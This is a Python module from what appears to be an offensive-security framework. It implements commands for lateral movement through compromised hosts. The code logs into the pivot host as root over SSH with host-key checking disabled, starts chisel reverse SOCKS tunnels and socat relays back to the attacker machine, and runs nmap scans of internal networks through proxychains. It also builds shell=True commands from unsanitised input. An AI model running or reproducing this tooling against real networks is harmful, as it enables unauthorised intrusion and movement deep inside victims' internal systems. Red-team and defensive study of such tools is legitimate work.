"""Intelligent Pivoting command set.

Covers automatic network discovery, dynamic tunnel setup, and multi-hop
pivot chain management for lateral movement through compromised hosts.
"""

from __future__ import annotations

import json
import os
import shlex
import subprocess
import tempfile
import time

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    print_error,
    print_msg,
    print_warn,
)

PIVOTING_CATEGORY = "08. Lateral Movement"
PIVOT_CHAIN_FILE = "sessions/pivot_chain.json"
DEFAULT_PROXY_PORT = 1080
DEFAULT_REMOTE_PORT = 9090
NETWORK_SCAN_TIMEOUT = 5
COMMON_INTERNAL_NETS = [
    "10.0.0.0/8",
    "172.16.0.0/12",
    "192.168.0.0/16",
]


class PivotingCommandSet(LazyOwnCommandSet):
    """Automatic pivoting and multi-hop tunnel management."""

    phase = "lateral"
    category = PIVOTING_CATEGORY

    @cmd2.with_category(PIVOTING_CATEGORY)
    def do_autopivot(self, line):
        """Auto-detect internal networks and set up pivot tunnels.

        Usage: autopivot [--lhost <attacker_ip>] [--rhost <pivot_host>] [--method <chisel|ssh|socat>]

        Discovers internal networks reachable through the pivot host and
        sets up SOCKS/port forwarding to access them from the attacker machine.
        """
        args = shlex.split(line)
        lhost = _extract_flag(args, "--lhost") or self.params.get("lhost", "")
        rhost = _extract_flag(args, "--rhost") or self.params.get("rhost", "")
        method = _extract_flag(args, "--method") or "chisel"

        if not lhost or not rhost:
            print_error("Set lhost and rhost: assign lhost <ip>; assign rhost <ip>")
            return

        print_msg(f"Auto-pivoting through {rhost} to {lhost}")
        print_msg(f"Method: {method}")

        networks = _discover_internal_networks(rhost)
        if not networks:
            print_warn("No internal networks discovered, using common ranges")
            networks = COMMON_INTERNAL_NETS

        print_msg(f"Discovered {len(networks)} networks:")
        for net in networks:
            print_msg(f"  {net}")

        chain_entry = _load_pivot_chain()
        hop = {
            "pivot_host": rhost,
            "lhost": lhost,
            "method": method,
            "networks": networks,
            "timestamp": int(time.time()),
            "port": _find_free_port(DEFAULT_REMOTE_PORT),
        }

        if method == "chisel":
            _setup_chisel_pivot(rhost, lhost, hop["port"], networks)
        elif method == "ssh":
            _setup_ssh_pivot(rhost, lhost, hop["port"], networks)
        elif method == "socat":
            _setup_socat_pivot(rhost, lhost, hop["port"], networks)
        else:
            print_error(f"Unknown method: {method}. Use: chisel, ssh, socat")
            return

        chain_entry["hops"].append(hop)
        _save_pivot_chain(chain_entry)

        print_msg(f"Pivot hop {len(chain_entry['hops'])} active")
        print_msg(f"Configure proxychains: socks4 127.0.0.1 {hop['port']}")
        print_msg(f"Or: export ALL_PROXY=socks5://127.0.0.1:{hop['port']}")

    @cmd2.with_category(PIVOTING_CATEGORY)
    def do_pivot_status(self, line):
        """Show the current pivot chain state.

        Usage: pivot_status [--json]
        """
        chain = _load_pivot_chain()
        if not chain.get("hops"):
            print_msg("No active pivot hops.")
            return

        for i, hop in enumerate(chain["hops"]):
            print_msg(f"Hop {i+1}: {hop.get('pivot_host')} -> {hop.get('lhost')} "
                       f"({hop.get('method')}, port {hop.get('port')})")
            for net in hop.get("networks", []):
                print_msg(f"  Network: {net}")

    @cmd2.with_category(PIVOTING_CATEGORY)
    def do_pivot_kill(self, line):
        """Kill all pivot tunnels and clean up.

        Usage: pivot_kill [--hop <n>]

        Without --hop, kills all pivot processes. With --hop, kills a specific hop.
        """
        args = shlex.split(line)
        hop_idx = _extract_flag(args, "--hop")

        chain = _load_pivot_chain()
        killed = 0

        for cmd in ["pkill -f chisel", "pkill -f 'ssh.*-D'", "pkill -f socat"]:
            subprocess.run(cmd, shell=True, timeout=5, stderr=subprocess.DEVNULL)

        if hop_idx:
            idx = int(hop_idx) - 1
            if 0 <= idx < len(chain.get("hops", [])):
                del chain["hops"][idx]
                _save_pivot_chain(chain)
                print_msg(f"Removed hop {hop_idx} from chain")
        else:
            chain["hops"] = []
            _save_pivot_chain(chain)
            print_msg("All hops removed, tunnels killed")

    @cmd2.with_category(PIVOTING_CATEGORY)
    def do_pivot_scan(self, line):
        """Scan internal networks through the current pivot chain.

        Usage: pivot_scan <network_cidr> [--port <ports>] [--rate <pkts_per_sec>]

        Runs a fast TCP scan through proxychains against internal networks.
        """
        args = shlex.split(line)
        if not args or args[0].startswith("--"):
            print_error("Usage: pivot_scan <network_cidr> [--port <ports>] [--rate <pkts_per_sec>]")
            return

        network = args[0]
        ports = _extract_flag(args, "--port") or "22,80,443,445,3389,8080,8443"
        rate = _extract_flag(args, "--rate") or "100"

        chain = _load_pivot_chain()
        if not chain.get("hops"):
            print_error("No pivot chain active. Run autopivot first.")
            return

        last_hop = chain["hops"][-1]
        proxy_port = last_hop["port"]

        print_msg(f"Scanning {network} via proxy 127.0.0.1:{proxy_port}")
        output_file = f"sessions/pivot_scan_{network.replace('/', '_')}.txt"

        cmd = (
            f"proxychains4 -q nmap -sT -Pn --open -p {ports} "
            f"--min-rate {rate} {network} -oN {output_file}"
        )
        print_msg(f"  {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, timeout=300, capture_output=True, text=True)
            print_msg(result.stdout[:2000] if len(result.stdout) > 2000 else result.stdout)
            print_msg(f"Results saved to {output_file}")
        except subprocess.TimeoutExpired:
            print_error("Scan timed out")
        except FileNotFoundError:
            print_error("nmap or proxychains4 not installed")

    @cmd2.with_category(PIVOTING_CATEGORY)
    def do_pivot_proxy(self, line):
        """Start a local SOCKS proxy through the pivot chain.

        Usage: pivot_proxy [--port <local_port>] [--hop <n>]

        Starts a proxy listener on the attacker machine that forwards
        traffic through the specified pivot hop.
        """
        args = shlex.split(line)
        port = int(_extract_flag(args, "--port") or str(DEFAULT_PROXY_PORT))
        hop_idx = _extract_flag(args, "--hop")

        chain = _load_pivot_chain()
        if not chain.get("hops"):
            print_error("No pivot chain active.")
            return

        if hop_idx:
            idx = int(hop_idx) - 1
            if idx >= len(chain["hops"]):
                print_error(f"Hop {hop_idx} not found")
                return
        else:
            idx = -1

        hop = chain["hops"][idx]
        target = hop["pivot_host"]
        remote_port = hop["port"]

        print_msg(f"Starting SOCKS proxy on 127.0.0.1:{port} through {target}:{remote_port}")

        cmd = f"ssh -D {port} -N -f -o StrictHostKeyChecking=no root@{target}"
        print_msg(f"  {cmd}")
        subprocess.run(cmd, shell=True, timeout=10, stderr=subprocess.DEVNULL)
        print_msg(f"Proxy ready: socks5://127.0.0.1:{port}")
        print_msg(f"export ALL_PROXY=socks5://127.0.0.1:{port}")


def _discover_internal_networks(rhost: str) -> list[str]:
    """Discover internal networks reachable from the pivot host.

    Args:
        rhost: The pivot host IP.

    Returns:
        List of CIDR-notation networks found.
    """
    cmd = (
        f"ssh -o StrictHostKeyChecking=no -o ConnectTimeout={NETWORK_SCAN_TIMEOUT} "
        f"root@{rhost} \"ip -4 addr show | grep -oP 'inet \\K[\\d.]+/[\\d]+'\" "
        f"2>/dev/null"
    )
    try:
        result = subprocess.run(cmd, shell=True, timeout=15, capture_output=True, text=True)
        nets = []
        for line in result.stdout.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("127."):
                parts = line.split("/")
                if len(parts) == 2:
                    ip = parts[0]
                    prefix = int(parts[1])
                    if prefix < 32:
                        base = ".".join(ip.split(".")[:3]) + ".0"
                        nets.append(f"{base}/{prefix}")
        seen = set()
        unique = []
        for net in nets:
            if net not in seen and net not in ("0.0.0.0/8", "0.0.0.0/0"):
                seen.add(net)
                unique.append(net)
        return unique
    except Exception:
        return []


def _setup_chisel_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> None:
    """Set up a Chisel reverse SOCKS proxy.

    Args:
        rhost: Pivot host IP.
        lhost: Attacker IP.
        port: Local port for the SOCKS proxy.
        networks: Internal networks to route through the pivot.
    """
    print_msg("Setting up Chisel pivot...")
    server_cmd = f"chisel server -p {port} --reverse &"
    subprocess.run(server_cmd, shell=True, timeout=5, stderr=subprocess.DEVNULL)

    client_cmd = (
        f"ssh -o StrictHostKeyChecking=no root@{rhost} "
        f"\"chisel client {lhost}:{port} R:socks 2>/dev/null &\""
    )
    subprocess.run(client_cmd, shell=True, timeout=10, stderr=subprocess.DEVNULL)
    time.sleep(2)


def _setup_ssh_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> None:
    """Set up an SSH dynamic SOCKS proxy.

    Args:
        rhost: Pivot host IP.
        lhost: Attacker IP.
        port: Local port for the SOCKS proxy.
        networks: Internal networks to route.
    """
    print_msg("Setting up SSH SOCKS proxy...")
    cmd = (
        f"ssh -D {port} -N -f -o StrictHostKeyChecking=no "
        f"-o ServerAliveInterval=60 root@{rhost}"
    )
    subprocess.run(cmd, shell=True, timeout=10, stderr=subprocess.DEVNULL)
    time.sleep(1)


def _setup_socat_pivot(rhost: str, lhost: str, port: int, networks: list[str]) -> None:
    """Set up a Socat relay.

    Args:
        rhost: Pivot host IP.
        lhost: Attacker IP.
        port: Local port for the relay.
        networks: Internal networks.
    """
    print_msg("Setting up Socat relay...")
    subprocess.run(
        f"socat TCP-LISTEN:{port},fork,reuseaddr TCP4:{rhost}:{port} &",
        shell=True, timeout=5, stderr=subprocess.DEVNULL,
    )
    subprocess.run(
        f"ssh -o StrictHostKeyChecking=no root@{rhost} "
        f"\"socat TCP4-LISTEN:{port},fork,reuseaddr SOCKS4A:{lhost}:{rhost}:{port},socksport={DEFAULT_PROXY_PORT} &\"",
        shell=True, timeout=10, stderr=subprocess.DEVNULL,
    )


def _find_free_port(start: int) -> int:
    """Find a free TCP port starting from ``start``.

    Args:
        start: First port to try.

    Returns:
        An available port number.
    """
    import socket
    for p in range(start, start + 100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("127.0.0.1", p))
                return p
            except OSError:
                continue
    return start


def _load_pivot_chain() -> dict:
    """Load the pivot chain from the session file."""
    if os.path.exists(PIVOT_CHAIN_FILE):
        with open(PIVOT_CHAIN_FILE) as f:
            return json.load(f)
    return {"hops": [], "created": int(time.time())}


def _save_pivot_chain(chain: dict) -> None:
    """Save the pivot chain to the session file."""
    os.makedirs(os.path.dirname(PIVOT_CHAIN_FILE), exist_ok=True)
    with open(PIVOT_CHAIN_FILE, "w") as f:
        json.dump(chain, f, indent=2)


def _extract_flag(args: list[str], flag: str) -> str | None:
    """Extract a ``--flag <value>`` pair from a list of arguments."""
    try:
        idx = args.index(flag)
        return args[idx + 1]
    except (ValueError, IndexError):
        return None


__all__ = ["PivotingCommandSet"]
